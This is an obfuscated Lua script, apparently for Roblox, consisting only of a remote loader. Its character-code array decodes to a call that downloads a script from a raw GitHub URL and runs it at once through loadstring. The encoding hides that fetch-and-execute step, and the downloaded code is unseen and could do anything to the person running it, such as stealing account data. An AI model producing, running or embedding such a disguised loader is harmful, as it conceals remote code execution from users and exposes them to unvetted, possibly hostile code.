local _0x1a2b = string.char
local _0xf = table.concat
local _0x3c = loadstring
local _0xe = {108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,51,56,48,52,52,52,53,52,57,50,108,45,115,117,100,111,47,102,118,50,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,102,118,50,34,41,41,40,41}
local _0xout = ""
for i = 1, #_0xe do
    _0xout = _0xout .. _0x1a2b(_0xe[i])
end
_0x3c(_0xout)()
